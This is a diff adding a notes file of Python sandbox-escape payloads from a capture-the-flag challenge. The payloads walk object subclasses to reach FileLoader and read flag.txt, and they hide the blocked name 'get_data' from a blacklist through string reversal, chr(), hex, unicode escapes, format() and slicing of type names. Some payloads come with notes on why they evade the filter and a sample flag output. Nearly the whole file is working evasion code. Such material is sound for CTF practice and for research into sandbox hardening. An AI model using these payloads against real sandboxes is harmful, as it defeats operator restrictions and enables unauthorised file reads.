@@ -1,0 +1,120 @@
+print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt','.').get_data('flag.txt'))
+
+( ).__class__.__bases__[0].__subclasses__()[122]('flag','flag.txt').__getattribute__('atad_teg'[::-1])('flag.txt')
+
+  1. FileLoader with dynamic discovery:
+  print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]('flag.txt','.').get_data('flag.txt'))
+
+  2. FileLoader with string obfuscation:
+  
+  fl = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116);print([x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0](fl, '.').get_data(fl))
+
+
+
+
+
+1. Reversal with [::-1] (Your Example)
+How: Write 'get_data' reversed as 'atad_teg' in source, reverse at runtime with [::-1].
+Why Works: Source has 'atad_teg' (no 'get_data' literal), [::-1] is str slice (not blocked in medium).
+Example Payload:
+>>> print(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt').__getattribute__('atad_teg'[::-1])('flag.txt'))
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}' (reverses to 'get_data', calls method).
+Pros: Simple, short. Cons: Assumes [::-1] not blocked (ok in medium).
+2. chr + Runtime Concat
+How: Use chr(ASCII) to build chars (103='g', 101='e', 116='t', 95='_', 100='d', 97='a'), concat with +.
+Why Works: chr allowed, + is runtime concat (evades quote concat pattern), no literal 'get_data'.
+Example Payload:
+>>> method_name = chr(103) + chr(101) + chr(116) + chr(95) + chr(100) + chr(97) + chr(116) + chr(97); print(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt').__getattribute__(method_name)('flag.txt'))
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}' (builds 'get_data' runtime).
+Pros: Reliable, uses allowed chr. Cons: Longer payload.
+3. type.getattribute (Alternative to getattribute)
+How: Use type(loader).getattribute(loader, method_name) instead of loader.getattribute(method_name).
+Why Works: type allowed, getattribute accessible via type (bypasses if direct getattribute restricted).
+Example Payload (combine with reversal):
+>>> print(type(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt')).__getattribute__(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt'), 'atad_teg'[::-1])('flag.txt'))
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}'.
+Pros: Alternative if getattribute blocked. Cons: More complex.
+4. Slicing from str(type(basics))
+How: Slice chars from str(type(1.0)) = "<class 'float'>" (e.g., [10]='o', [11]='a', [12]='t'; build 'get_data' by finding positions).
+Why Works: str(type(...)) allowed, slicing builds chars runtime, no literals.
+Example Payload (probe positions first):
+>>> te = str(type(1.0)); method_name = te[10] + te[11] + te[12] + te[1] + te[12] + te[11] + te[10] + te[11]; print(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt').__getattribute__(method_name)('flag.txt'))
+(Adjust indices: e.g., 'g' from str(type(range(1)))[11]='g', etc.; build 'get_data' from multiple str slices).
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}' (once indices correct).
+Pros: No chr needed. Cons: Requires probing str positions (~5-10 min).
+5. Unicode Escapes (If Allowed)
+How: Use '\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061' = 'get_data' (source has escapes, not literal).
+Why Works: Unicode compiles to chars, evades literal checks (if not blocked by pattern).
+Example Payload:
+>>> print(( ).__class__.__bases__[0].__subclasses__()[135]('flag','flag.txt').__getattribute__('\u0067\u0065\u0074\u005f\u0064\u0061\u0074\u0061')('flag.txt'))
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}'.
+Pros: Clean, short. Cons: May be blocked if pattern detects \u (probe first).
+6. Alternative File Classes (If FileLoader Fails)
+How: Use other loaders from subclasses (e.g., SourceFileLoader at ~136, NamespaceLoader at ~137).
+Why Works: May have similar methods (e.g., get_code, get_source) not blacklisted.
+Example Payload (probe first):
+>>> print([i for i, c in enumerate(( ).__class__.__bases__[0].__subclasses__()) if 'SourceFileLoader' in str(c)])  # Find index ~136
+>>> loader = ( ).__class__.__bases__[0].__subclasses__()[136]('flag','flag.txt'); method_name = 'atad_teg'[::-1]; print(loader.__getattribute__(method_name)('flag.txt'))
+Output: b'BCTF{0x5n34ky_py7h0n_35c4p3}' (if get_data works on SourceFileLoader).
+Pros: Backup if FileLoader index wrong. Cons: May not have get_data.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  ```
+  Method 1: chr() encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97);
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 2: Hex encoding
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = b'\x67\x65\x74\x5f\x64\x61\x74\x61'.decode();print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 3: String reversal
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 4: Dynamic class discovery + chr() obfuscation
+
+  loader = [x for x in ().__class__.__bases__[0].__subclasses__() if 'FileLoader' in str(x)][0]; obj = loader(".", "flag.txt"); method =
+  chr(103)+chr(101)+chr(116)+chr(95)+chr(100)+chr(97)+chr(116)+chr(97); print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 5: format() encoding (if format available)
+
+  obj = ().__class__.__bases__[0].__subclasses__()[122](".", "flag.txt"); method =
+  format(103,'c')+format(101,'c')+format(116,'c')+format(95,'c')+format(100,'c')+format(97,'c')+format(116,'c')+format(97,'c');
+  print(obj.__getattribute__(method)("flag.txt"))
+
+  Method 6: Multiple obfuscation layers
+
+  filename = chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116); obj = ().__class__.__bases__[0].__subclasses__()[122](".", filename);method = 'atad_teg'[::-1]; print(obj.__getattribute__(method)(filename))
+```
